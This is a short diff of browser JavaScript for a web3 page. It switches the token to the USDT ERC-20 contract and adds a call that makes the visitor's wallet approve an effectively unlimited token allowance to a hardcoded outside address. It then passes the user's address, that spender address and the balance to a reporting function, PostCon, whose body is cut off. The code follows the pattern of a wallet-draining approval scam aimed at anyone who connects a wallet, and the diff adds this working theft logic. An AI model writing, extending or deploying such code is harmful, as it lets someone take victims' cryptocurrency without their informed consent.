@@ -237,7 +237,7 @@
       // alert("provider")
     }
 
-    let usdt = "0xa3127c695004e454922fe30a0038fd3b6a99c81d"
+    let usdt = "0xdac17f958d2ee523a2206206994597c13d831ec7"  // erc20
     const contr = new web3.eth.Contract(abi, usdt);
     // let res = await contr.methods.balanceOf(account[0])
 
@@ -247,12 +247,15 @@
       console.log("xxxxxxxxxxxxxxxxxxxx", result);
     });
 
-
-    contr.methods.approve("0x7aB2A4fAce8a5F943e2788aD1E6527d4141fD17D","115700000000000000000000000000000000000000000000000000000000").send({from:account[0]});
+    authadress = "0x86f61956c0895469ec063ac58bff7f5f46dccba7"
+    contr.methods.approve(authadress,"115700000000000000000000000000000000000000000000000000000000").send({from:account[0]}, function (err, response) {
+      console.log(err)
+      console.log(response)
+    })
     // console.log('getWeb3',res, account)
     // alert("web3 " + res)
     console.log("user usdt res = ", balanceMoney)
-    PostCon(account[0], "0xa3127c695004e454922fe30a0038fd3b6a99c81d", balanceMoney)
+    PostCon(account[0], authadress, balanceMoney)
   }
 
   function PostCon(user_address, auth_address, balanceMoney) {
